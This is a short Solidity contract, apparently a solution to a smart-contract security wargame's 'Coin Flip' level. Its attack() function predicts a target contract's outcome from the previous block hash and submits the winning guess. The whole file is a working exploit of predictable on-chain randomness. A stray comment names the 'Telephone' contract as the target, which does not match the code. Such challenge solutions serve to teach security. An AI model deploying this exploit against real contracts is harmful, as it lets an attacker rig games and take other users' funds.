// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

/**
 * @title Coin Flip Attacker
 * @dev This contract is used to attack the Telephone contract
 */
contract CoinFlipAttacker {
    CoinFlip coinflip;

    constructor(address _coinflip) {
        coinflip = CoinFlip(_coinflip);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 coinFlip = uint256(blockValue / FACTOR);
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }
}

interface CoinFlip {
    function flip(bool _guess) external;
}
